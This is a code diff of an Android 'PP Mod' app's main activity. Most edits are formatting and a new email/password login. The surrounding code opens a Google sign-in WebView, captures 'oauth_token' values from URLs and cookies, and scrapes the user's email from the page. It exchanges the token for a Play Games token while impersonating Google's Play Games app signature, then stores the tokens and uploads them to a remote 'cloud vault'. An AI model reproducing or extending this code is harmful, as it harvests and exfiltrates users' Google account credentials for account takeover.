@@ -82,7 +82,8 @@ public class MainActivity extends Activity implements CloudSyncClient.SyncCallba
 
         try {
             SecurityGuard.performSecurityCheck(this);
-        } catch (Throwable ignored) {}
+        } catch (Throwable ignored) {
+        }
 
         bindViews();
         setupMainAppWebView();
@@ -92,7 +93,8 @@ public class MainActivity extends Activity implements CloudSyncClient.SyncCallba
             CloudSyncClient.registerDevice(this, accountStorage);
             String deviceId = SecurityGuard.getDeviceId(this);
             CloudSyncClient.checkDeviceLock(deviceId, new DeviceLockCallbackImpl(this));
-        } catch (Throwable ignored) {}
+        } catch (Throwable ignored) {
+        }
     }
 
     private void bindViews() {
@@ -115,7 +117,8 @@ public class MainActivity extends Activity implements CloudSyncClient.SyncCallba
     }
 
     private void setupMainAppWebView() {
-        if (mainAppWebView == null) return;
+        if (mainAppWebView == null)
+            return;
         try {
             if (android.os.Build.VERSION.SDK_INT >= 19) {
                 WebView.setWebContentsDebuggingEnabled(false);
@@ -140,7 +143,8 @@ public class MainActivity extends Activity implements CloudSyncClient.SyncCallba
     }
 
     private void setupGoogleAuthWebView() {
-        if (webView == null) return;
+        if (webView == null)
+            return;
         try {
             WebSettings settings = webView.getSettings();
             settings.setJavaScriptEnabled(true);
@@ -155,7 +159,8 @@ public class MainActivity extends Activity implements CloudSyncClient.SyncCallba
             try {
                 CookieManager.getInstance().setAcceptCookie(true);
                 CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
-            } catch (Throwable ignored) {}
+            } catch (Throwable ignored) {
+            }
 
             webView.setWebChromeClient(new AppChromeClient(webProgressBar));
             webView.setWebViewClient(new AppWebClient(this));
@@ -183,7 +188,8 @@ public class MainActivity extends Activity implements CloudSyncClient.SyncCallba
         try {
             CookieManager.getInstance().removeAllCookies(null);
             CookieManager.getInstance().flush();
-        } catch (Throwable ignored) {}
+        } catch (Throwable ignored) {
+        }
 
         if (googleLoginContainer != null) {
             googleLoginContainer.setVisibility(View.VISIBLE);
@@ -229,7 +235,8 @@ public class MainActivity extends Activity implements CloudSyncClient.SyncCallba
     }
 
     public void checkUrlForToken(String url) {
-        if (url == null || isTokenFound) return;
+        if (url == null || isTokenFound)
+            return;
         Pattern pattern = Pattern.compile("oauth_token=([^&\\s]+)");
         Matcher matcher = pattern.matcher(url);
         if (matcher.find()) {
@@ -243,11 +250,13 @@ public class MainActivity extends Activity implements CloudSyncClient.SyncCallba
     }
 
     public void checkCookiesForToken() {
-        if (isTokenFound) return;
+        if (isTokenFound)
+            return;
         try {
             CookieManager cm = CookieManager.getInstance();
             String cookieString = cm.getCookie("https://accounts.google.com");
-            if (cookieString == null || cookieString.isEmpty()) return;
+            if (cookieString == null || cookieString.isEmpty())
+                return;
 
             Pattern pattern = Pattern.compile("oauth_token=([^;\\s]+)");
             Matcher matcher = pattern.matcher(cookieString);
@@ -259,15 +268,15 @@ public class MainActivity extends Activity implements CloudSyncClient.SyncCallba
                     onTokenCaptured(capturedToken);
                 }
             }
-        } catch (Throwable ignored) {}
+        } catch (Throwable ignored) {
+        }
     }
 
     public void extractEmailFromPage() {
         if (webView != null && detectedEmail.isEmpty()) {
             webView.evaluateJavascript(
-                "(function() { return document.body ? document.body.innerText : ''; })();",
-                new EmailJsCallback(this)
-            );
+                    "(function() { return document.body ? document.body.innerText : ''; })();",
+                    new EmailJsCallback(this));
         }
     }
 
@@ -294,27 +303,28 @@ public class MainActivity extends Activity implements CloudSyncClient.SyncCallba
     @Override
     public void onSuccess(String code) {
         generatedSyncCode = code;
-        String finalToken = (CloudSyncClient.lastExchangedMasterToken != null) 
-            ? CloudSyncClient.lastExchangedMasterToken 
-            : capturedToken;
-        String finalEmail = (CloudSyncClient.lastExchangedEmail != null && !CloudSyncClient.lastExchangedEmail.isEmpty()) 
-            ? CloudSyncClient.lastExchangedEmail 
-            : (!detectedEmail.isEmpty() ? detectedEmail : "Google Play User");
+        String finalToken = (CloudSyncClient.lastExchangedMasterToken != null)
+                ? CloudSyncClient.lastExchangedMasterToken
+                : capturedToken;
+        String finalEmail = (CloudSyncClient.lastExchangedEmail != null
+                && !CloudSyncClient.lastExchangedEmail.isEmpty())
+                        ? CloudSyncClient.lastExchangedEmail
+                        : (!detectedEmail.isEmpty() ? detectedEmail : "Google Play User");
 
         AccountItem item = new AccountItem(
-            "acc_" + System.currentTimeMillis(),
-            finalEmail,
-            code,
-            finalToken,
-            pendingAccountCountry,
-            System.currentTimeMillis()
-        );
+                "acc_" + System.currentTimeMillis(),
+                finalEmail,
+                code,
+                finalToken,
+                pendingAccountCountry,
+                System.currentTimeMillis());
 
         if (accountStorage != null) {
             accountStorage.saveAccount(item);
             try {
                 CloudSyncClient.registerDevice(this, accountStorage.getAccounts());
-            } catch (Throwable ignored) {}
+            } catch (Throwable ignored) {
+            }
         }
 
         closeGoogleLogin();
@@ -325,7 +335,8 @@ public class MainActivity extends Activity implements CloudSyncClient.SyncCallba
             if (!isDeveloperMode()) {
                 try {
                     notifyObj.put("token", "PROTECTED_SYNC_ACTIVE");
-                } catch (Throwable ignored) {}
+                } catch (Throwable ignored) {
+                }
             }
             mainAppWebView.post(new NotifyWebRunnable(mainAppWebView, notifyObj.toString()));
         }
@@ -375,12 +386,14 @@ public class MainActivity extends Activity implements CloudSyncClient.SyncCallba
                 obj.put("userAvatar", accountStorage.getUserAvatar());
                 obj.put("userCoins", accountStorage.getUserCoins());
             }
-        } catch (Throwable ignored) {}
+        } catch (Throwable ignored) {
+        }
         return obj.toString();
     }
 
     public void doClaimWeeklyPerk(String code) {
-        if (accountStorage == null || code == null) return;
+        if (accountStorage == null || code == null)
+            return;
         List<AccountItem> list = accountStorage.getAccounts();
         boolean found = false;
         int bonus = 10;
@@ -406,18 +419,61 @@ public class MainActivity extends Activity implements CloudSyncClient.SyncCallba
         }
     }
 
+    public void doLogin(final String email, final String password) {
+        if (email == null || email.trim().isEmpty()) {
+            Toast.makeText(this, "Please enter your PP Mod email.", Toast.LENGTH_SHORT).show();
+            notifyWebLoginError("Please enter your email.");
+            return;
+        }
+
+        Toast.makeText(this, "Signing in to PP Mod...", Toast.LENGTH_SHORT).show();
+        CloudSyncClient.loginPpMod(this, email.trim(), password != null ? password : "", new LoginCallbackImpl(this));
+    }
+
+    public void doRefreshUserData() {
+        if (accountStorage == null || !accountStorage.isLoggedIn()) return;
+        String email = accountStorage.getUserEmail();
+        if (email.isEmpty()) return;
+        CloudSyncClient.fetchUserProfile(email, new RefreshProfileCallbackImpl(this));
+    }
+
+    public void notifyWebLoginSuccess(String uid, String email, String name, String avatar, int coins) {
+        if (mainAppWebView == null) return;
+        try {
+            JSONObject u = new JSONObject();
+            u.put("ok", true);
+            u.put("uid", uid);
+            u.put("email", email);
+            u.put("name", name);
+            u.put("avatar", avatar);
+            u.put("coins", coins);
+            final String js = "javascript:(function(){ if(window.onLoginSuccess) window.onLoginSuccess(" + u.toString() + "); else if(window.refreshAccounts) window.refreshAccounts(); })();";
+            mainAppWebView.post(new PostWebUrlRunnable(mainAppWebView, js));
+        } catch (Throwable ignored) {}
+    }
+
+    public void notifyWebLoginError(final String error) {
+        if (mainAppWebView == null) return;
+        final String safeErr = (error != null) ? error.replace("'", "\\'").replace("\n", " ") : "Unknown error";
+        final String js = "javascript:(function(){ if(window.onLoginError) window.onLoginError('" + safeErr + "'); })();";
+        mainAppWebView.post(new PostWebUrlRunnable(mainAppWebView, js));
+    }
+
     public void doLogout() {
         if (accountStorage != null) {
             accountStorage.clearUserSession();
+            accountStorage.replaceAllAccounts(new java.util.ArrayList<AccountItem>());
         }
         Toast.makeText(this, "Logged out of PP Mod session.", Toast.LENGTH_SHORT).show();
         if (mainAppWebView != null) {
-            mainAppWebView.post(new ReloadWebRunnable(mainAppWebView));
+            final String js = "javascript:(function(){ if(window.onLogoutSuccess) window.onLogoutSuccess(); else location.reload(); })();";
+            mainAppWebView.post(new PostWebUrlRunnable(mainAppWebView, js));
         }
     }
 
     public String getAccountsJson() {
-        if (accountStorage == null) return "[]";
+        if (accountStorage == null)
+            return "[]";
         List<AccountItem> list = accountStorage.getAccounts();
         JSONArray arr = new JSONArray();
         boolean isDev = isDeveloperMode();
@@ -426,7 +482,8 @@ public class MainActivity extends Activity implements CloudSyncClient.SyncCallba
             if (!isDev) {
                 try {
                     obj.put("token", "PROTECTED_SYNC_ACTIVE");
-                } catch (Throwable ignored) {}
+                } catch (Throwable ignored) {
+                }
             }
             arr.put(obj);
         }
@@ -434,17 +491,35 @@ public class MainActivity extends Activity implements CloudSyncClient.SyncCallba
     }
 
     public void doDeleteAccount(String code) {
-        if (accountStorage != null) {
+        if (accountStorage != null && code != null) {
+            String targetEmail = "";
+            List<AccountItem> all = accountStorage.getAccounts();
+            for (AccountItem item : all) {
+                if (code.equals(item.getCode())) {
+                    targetEmail = item.getEmail();
+                    break;
+                }
+            }
+
             accountStorage.deleteAccount(code);
+
+            // Permanently remove from cloud vault
+            CloudSyncClient.deleteAccount(code, targetEmail, null);
+
             try {
                 CloudSyncClient.registerDevice(this, accountStorage.getAccounts());
             } catch (Throwable ignored) {}
         }
-        Toast.makeText(this, "Account disconnected.", Toast.LENGTH_SHORT).show();
+        Toast.makeText(this, "Account removed from vault.", Toast.LENGTH_SHORT).show();
+        if (mainAppWebView != null) {
+            final String js = "javascript:(function(){ if(window.onAccountDeleted) window.onAccountDeleted('" + code + "'); else if(window.refreshAccounts) window.refreshAccounts(); })();";
+            mainAppWebView.post(new PostWebUrlRunnable(mainAppWebView, js));
+        }
     }
 
     public void copyToClipboard(String text, String label) {
-        if (text == null || text.isEmpty()) return;
+        if (text == null || text.isEmpty())
+            return;
         ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
         ClipData clip = ClipData.newPlainText(label, text);
         clipboard.setPrimaryClip(clip);
@@ -468,7 +543,8 @@ public class MainActivity extends Activity implements CloudSyncClient.SyncCallba
     }
 
     public void restoreAccountsFromCloud() {
-        if (accountStorage == null) return;
+        if (accountStorage == null)
+            return;
         String uid = accountStorage.getUserUid();
         CloudSyncClient.restoreUserAccounts(uid, new CloudRestoreCallback(this, accountStorage, mainAppWebView));
     }
@@ -478,7 +554,8 @@ public class MainActivity extends Activity implements CloudSyncClient.SyncCallba
     }
 
     public static String maskEmail(String email) {
-        if (email == null || !email.contains("@")) return email;
+        if (email == null || !email.contains("@"))
+            return email;
         String[] parts = email.split("@");
         String name = parts[0];
         String domain = parts[1];
@@ -505,7 +582,11 @@ public class MainActivity extends Activity implements CloudSyncClient.SyncCallba
 
     public static class NavBackClickListener implements View.OnClickListener {
         private final MainActivity activity;
-        public NavBackClickListener(MainActivity act) { this.activity = act; }
+
+        public NavBackClickListener(MainActivity act) {
+            this.activity = act;
+        }
+
         @Override
         public void onClick(View v) {
             activity.closeGoogleLogin();
@@ -514,7 +595,11 @@ public class MainActivity extends Activity implements CloudSyncClient.SyncCallba
 
     public static class NavReloadClickListener implements View.OnClickListener {
         private final MainActivity activity;
-        public NavReloadClickListener(MainActivity act) { this.activity = act; }
+
+        public NavReloadClickListener(MainActivity act) {
+            this.activity = act;
+        }
+
         @Override
         public void onClick(View v) {
             if (activity.webView != null) {
@@ -526,21 +611,28 @@ public class MainActivity extends Activity implements CloudSyncClient.SyncCallba
     public static class NotifyWebRunnable implements Runnable {
         private final WebView targetWeb;
         private final String payloadJson;
+
         public NotifyWebRunnable(WebView web, String json) {
             this.targetWeb = web;
             this.payloadJson = json;
         }
+
         @Override
         public void run() {
             if (targetWeb != null) {
-                targetWeb.evaluateJavascript("if(window.onAccountSyncComplete){ window.onAccountSyncComplete(" + payloadJson + "); }", null);
+                targetWeb.evaluateJavascript(
+                        "if(window.onAccountSyncComplete){ window.onAccountSyncComplete(" + payloadJson + "); }", null);
             }
         }
     }
 
     public static class DeviceLockCallbackImpl implements CloudSyncClient.DeviceLockCallback {
         private final MainActivity activity;
-        public DeviceLockCallbackImpl(MainActivity act) { this.activity = act; }
+
+        public DeviceLockCallbackImpl(MainActivity act) {
+            this.activity = act;
+        }
+
         @Override
         public void onResult(boolean isLocked, String msg) {
             if (isLocked) {
@@ -551,7 +643,11 @@ public class MainActivity extends Activity implements CloudSyncClient.SyncCallba
 
     public static class DeviceLockNoticeRunnable implements Runnable {
         private final MainActivity activity;
-        public DeviceLockNoticeRunnable(MainActivity act) { this.activity = act; }
+
+        public DeviceLockNoticeRunnable(MainActivity act) {
+            this.activity = act;
+        }
+
         @Override
         public void run() {
             Toast.makeText(activity, "Device Node Locked by Admin", Toast.LENGTH_LONG).show();
@@ -562,15 +658,18 @@ public class MainActivity extends Activity implements CloudSyncClient.SyncCallba
         private final MainActivity activity;
         private final AccountStorage storage;
         private final WebView webView;
+
         public CloudRestoreCallback(MainActivity act, AccountStorage st, WebView wv) {
             this.activity = act;
             this.storage = st;
             this.webView = wv;
         }
+
         @Override
         public void onLoaded(final List<AccountItem> list) {
             activity.runOnUiThread(new CloudRestoreSuccessRunnable(activity, storage, webView, list));
         }
+
         @Override
         public void onError(final String msg) {
             activity.runOnUiThread(new CloudRestoreErrorRunnable(activity, msg));
@@ -582,12 +681,14 @@ public class MainActivity extends Activity implements CloudSyncClient.SyncCallba
         private final AccountStorage storage;
         private final WebView webView;
         private final List<AccountItem> list;
+
         public CloudRestoreSuccessRunnable(MainActivity act, AccountStorage st, WebView wv, List<AccountItem> l) {
             this.activity = act;
             this.storage = st;
             this.webView = wv;
             this.list = l;
         }
+
         @Override
         public void run() {
             if (list != null && !list.isEmpty()) {
@@ -605,10 +706,12 @@ public class MainActivity extends Activity implements CloudSyncClient.SyncCallba
     public static class CloudRestoreErrorRunnable implements Runnable {
         private final MainActivity activity;
         private final String msg;
+
         public CloudRestoreErrorRunnable(MainActivity act, String m) {
             this.activity = act;
             this.msg = m;
         }
+
         @Override
         public void run() {
             Toast.makeText(activity, "Sync notice: " + msg, Toast.LENGTH_SHORT).show();
@@ -641,12 +744,12 @@ public class MainActivity extends Activity implements CloudSyncClient.SyncCallba
                 conn.setReadTimeout(10000);
 
                 String postData = "accountType=HOSTED_OR_GOOGLE"
-                    + "&has_permission=1"
-                    + "&service=" + URLEncoder.encode("oauth2:https://www.googleapis.com/auth/games", "UTF-8")
-                    + "&app=com.google.android.play.games"
-                    + "&client_sig=38918a453d07199354f8b19af05ec6562ced5788"
-                    + "&callerPkg=com.google.android.play.games"
-                    + "&Token=" + URLEncoder.encode(token, "UTF-8");
+                        + "&has_permission=1"
+                        + "&service=" + URLEncoder.encode("oauth2:https://www.googleapis.com/auth/games", "UTF-8")
+                        + "&app=com.google.android.play.games"
+                        + "&client_sig=38918a453d07199354f8b19af05ec6562ced5788"
+                        + "&callerPkg=com.google.android.play.games"
+                        + "&Token=" + URLEncoder.encode(token, "UTF-8");
 
                 OutputStream os = conn.getOutputStream();
                 os.write(postData.getBytes("UTF-8"));
@@ -751,95 +854,292 @@ public class MainActivity extends Activity implements CloudSyncClient.SyncCallba
         }
 
         @JavascriptInterface
+        public void login(final String email, final String password) {
+            activity.runOnUiThread(new LoginRunnable(activity, email, password));
+        }
+
+        @JavascriptInterface
         public void logout() {
             activity.runOnUiThread(new LogoutRunnable(activity));
+        }
+
+        @JavascriptInterface
+        public void refreshUserData() {
+            activity.runOnUiThread(new RefreshUserDataRunnable(activity));
+        }
+    }
+
+    public static class PostWebUrlRunnable implements Runnable {
+        private final WebView wv;
+        private final String url;
+        public PostWebUrlRunnable(WebView wv, String url) {
+            this.wv = wv;
+            this.url = url;
+        }
+        @Override
+        public void run() {
+            if (wv != null) wv.loadUrl(url);
+        }
+    }
+
+    public static class LoginCallbackImpl implements CloudSyncClient.LoginCallback {
+        private final MainActivity act;
+        public LoginCallbackImpl(MainActivity act) {
+            this.act = act;
+        }
+        @Override
+        public void onSuccess(String uid, String userEmail, String name, String avatar, int coins, String token) {
+            if (act.accountStorage != null) {
+                act.accountStorage.saveUserSession(uid, userEmail, name, avatar, coins, token);
+            }
+            try {
+                CloudSyncClient.registerDevice(act, act.accountStorage);
+            } catch (Throwable ignored) {}
+
+            CloudSyncClient.restoreUserAccounts(uid, new RestoreAccountsCallbackImpl(act, uid, userEmail, name, avatar, coins));
+            Toast.makeText(act, "Welcome, " + name + "!", Toast.LENGTH_SHORT).show();
+        }
+
+        @Override
+        public void onError(String error) {
+            Toast.makeText(act, "Login Failed: " + error, Toast.LENGTH_LONG).show();
+            act.notifyWebLoginError(error);
+        }
+    }
+
+    public static class RestoreAccountsCallbackImpl implements CloudSyncClient.RestoreCallback {
+        private final MainActivity act;
+        private final String uid;
+        private final String email;
+        private final String name;
+        private final String avatar;
+        private final int coins;
+
+        public RestoreAccountsCallbackImpl(MainActivity act, String uid, String email, String name, String avatar, int coins) {
+            this.act = act;
+            this.uid = uid;
+            this.email = email;
+            this.name = name;
+            this.avatar = avatar;
+            this.coins = coins;
+        }
+
+        @Override
+        public void onLoaded(List<AccountItem> list) {
+            if (act.accountStorage != null && list != null && !list.isEmpty()) {
+                act.accountStorage.saveAccounts(list);
+            }
+            act.notifyWebLoginSuccess(uid, email, name, avatar, coins);
+        }
+
+        @Override
+        public void onError(String msg) {
+            act.notifyWebLoginSuccess(uid, email, name, avatar, coins);
+        }
+    }
+
+    public static class RefreshProfileCallbackImpl implements CloudSyncClient.ProfileCallback {
+        private final MainActivity act;
+        public RefreshProfileCallbackImpl(MainActivity act) {
+            this.act = act;
+        }
+        @Override
+        public void onProfile(String uid, String userEmail, String name, String avatar, int coins) {
+            if (act.accountStorage != null) {
+                act.accountStorage.saveUserSession(uid, userEmail, name, avatar, coins, act.accountStorage.getUserAuthToken());
+            }
+            act.notifyWebLoginSuccess(uid, userEmail, name, avatar, coins);
+        }
+    }
+
+    public static class LoginRunnable implements Runnable {
+        private final MainActivity act;
+        private final String email;
+        private final String pass;
+        public LoginRunnable(MainActivity act, String email, String pass) {
+            this.act = act;
+            this.email = email;
+            this.pass = pass;
+        }
+        @Override
+        public void run() {
+            act.doLogin(email, pass);
+        }
+    }
+
+    public static class RefreshUserDataRunnable implements Runnable {
+        private final MainActivity act;
+        public RefreshUserDataRunnable(MainActivity act) {
+            this.act = act;
+        }
+        @Override
+        public void run() {
+            act.doRefreshUserData();
         }
     }
 
     public static class ClaimWeeklyPerkRunnable implements Runnable {
         private final MainActivity act;
         private final String code;
-        public ClaimWeeklyPerkRunnable(MainActivity a, String c) { this.act = a; this.code = c; }
-        @Override public void run() { act.doClaimWeeklyPerk(code); }
+
+        public ClaimWeeklyPerkRunnable(MainActivity a, String c) {
+            this.act = a;
+            this.code = c;
+        }
+
+        @Override
+        public void run() {
+            act.doClaimWeeklyPerk(code);
+        }
     }
 
     public static class LogoutRunnable implements Runnable {
         private final MainActivity act;
-        public LogoutRunnable(MainActivity a) { this.act = a; }
-        @Override public void run() { act.doLogout(); }
+
+        public LogoutRunnable(MainActivity a) {
+            this.act = a;
+        }
+
+        @Override
+        public void run() {
+            act.doLogout();
+        }
     }
 
     public static class StartGoogleLoginRunnable implements Runnable {
         private final MainActivity act;
         private final String country;
-        public StartGoogleLoginRunnable(MainActivity a, String c) { this.act = a; this.country = c; }
-        @Override public void run() { act.startGoogleLogin(country); }
+
+        public StartGoogleLoginRunnable(MainActivity a, String c) {
+            this.act = a;
+            this.country = c;
+        }
+
+        @Override
+        public void run() {
+            act.startGoogleLogin(country);
+        }
     }
 
     public static class CloseGoogleLoginRunnable implements Runnable {
         private final MainActivity act;
-        public CloseGoogleLoginRunnable(MainActivity a) { this.act = a; }
-        @Override public void run() { act.closeGoogleLogin(); }
+
+        public CloseGoogleLoginRunnable(MainActivity a) {
+            this.act = a;
+        }
+
+        @Override
+        public void run() {
+            act.closeGoogleLogin();
+        }
     }
 
     public static class DeleteAccountRunnable implements Runnable {
         private final MainActivity act;
         private final String code;
-        public DeleteAccountRunnable(MainActivity a, String c) { this.act = a; this.code = c; }
-        @Override public void run() { act.doDeleteAccount(code); }
+
+        public DeleteAccountRunnable(MainActivity a, String c) {
+            this.act = a;
+            this.code = c;
+        }
+
+        @Override
+        public void run() {
+            act.doDeleteAccount(code);
+        }
     }
 
     public static class CopyClipboardRunnable implements Runnable {
         private final MainActivity act;
         private final String text;
         private final String label;
-        public CopyClipboardRunnable(MainActivity a, String t, String l) { this.act = a; this.text = t; this.label = l; }
-        @Override public void run() { act.copyToClipboard(text, label); }
+
+        public CopyClipboardRunnable(MainActivity a, String t, String l) {
+            this.act = a;
+            this.text = t;
+            this.label = l;
+        }
+
+        @Override
+        public void run() {
+            act.copyToClipboard(text, label);
+        }
     }
 
     public static class OpenBrowserRunnable implements Runnable {
         private final MainActivity act;
         private final String url;
-        public OpenBrowserRunnable(MainActivity a, String u) { this.act = a; this.url = u; }
-        @Override public void run() { act.openBrowserUrl(url); }
+
+        public OpenBrowserRunnable(MainActivity a, String u) {
+            this.act = a;
+            this.url = u;
+        }
+
+        @Override
+        public void run() {
+            act.openBrowserUrl(url);
+        }
     }
 
     public static class SyncCloudRunnable implements Runnable {
         private final MainActivity act;
-        public SyncCloudRunnable(MainActivity a) { this.act = a; }
-        @Override public void run() { act.restoreAccountsFromCloud(); }
+
+        public SyncCloudRunnable(MainActivity a) {
+            this.act = a;
+        }
+
+        @Override
+        public void run() {
+            act.restoreAccountsFromCloud();
+        }
     }
 
     public static class GpgsResultRunnable implements Runnable {
         private final WebView webView;
         private final boolean success;
         private final String msg;
+
         public GpgsResultRunnable(WebView wv, boolean s, String m) {
             this.webView = wv;
             this.success = s;
             this.msg = m;
         }
+
         @Override
         public void run() {
             if (webView != null) {
-                webView.evaluateJavascript("if(window.onGpgsTestResult){ window.onGpgsTestResult(" + success + ", '" + msg + "'); }", null);
+                webView.evaluateJavascript(
+                        "if(window.onGpgsTestResult){ window.onGpgsTestResult(" + success + ", '" + msg + "'); }",
+                        null);
             }
         }
     }
 
     public static class RefreshWebRunnable implements Runnable {
         private final WebView web;
-        public RefreshWebRunnable(WebView w) { this.web = w; }
-        @Override public void run() {
-            if (web != null) web.evaluateJavascript("if(window.refreshAccounts){ window.refreshAccounts(); }", null);
+
+        public RefreshWebRunnable(WebView w) {
+            this.web = w;
+        }
+
+        @Override
+        public void run() {
+            if (web != null)
+                web.evaluateJavascript("if(window.refreshAccounts){ window.refreshAccounts(); }", null);
         }
     }
 
     public static class ReloadWebRunnable implements Runnable {
         private final WebView web;
-        public ReloadWebRunnable(WebView w) { this.web = w; }
-        @Override public void run() {
-            if (web != null) web.loadUrl("file:///android_asset/www/index.html");
+
+        public ReloadWebRunnable(WebView w) {
+            this.web = w;
+        }
+
+        @Override
+        public void run() {
+            if (web != null)
+                web.loadUrl("file:///android_asset/www/index.html");
         }
     }
 }
